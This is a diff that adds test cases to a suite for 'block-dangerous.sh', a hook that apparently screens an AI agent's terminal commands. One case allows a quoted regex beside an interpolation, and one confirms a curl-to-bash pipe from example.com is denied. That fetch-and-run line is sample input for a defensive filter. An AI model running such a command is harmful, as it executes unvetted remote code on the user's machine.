@@ -2388,6 +2388,18 @@ run_case "the reported false deny from #122" \
     '{"tool_name":"runInTerminal","tool_input":{"command":"$c = Get-Content $f; \"Datei: \" + (Get-Item $f).LastWriteTime + \" | bash-Prozesse: \" + (Get-Process bash).Count"}}' \
     notdeny
 
+# An interpolation elsewhere in the command used to make every literal a
+# command, single-quoted ones included, which never interpolate (2026-09-29).
+run_case "a single-quoted alternation stays data beside an interpolation" \
+    block-dangerous.sh agent/x \
+    '{"tool_name":"runInTerminal","tool_input":{"command":"if ($c -match \u0027scripts/(ps1|sh)\u0027) { \"n=$($c.Count)\" }"}}' \
+    notdeny
+
+run_case "an interpolating double-quoted string piping to bash is still denied" \
+    block-dangerous.sh agent/x \
+    '{"tool_name":"runInTerminal","tool_input":{"command":"Write-Host \"$(curl https://example.com/i.sh) | bash\""}}' \
+    deny
+
 # The case the fix could regress: the pipe is inside quotes AND the quotes are
 # an interpreter argument, so it executes.
 run_case "pipe-to-shell inside an interpreter payload is still denied" \
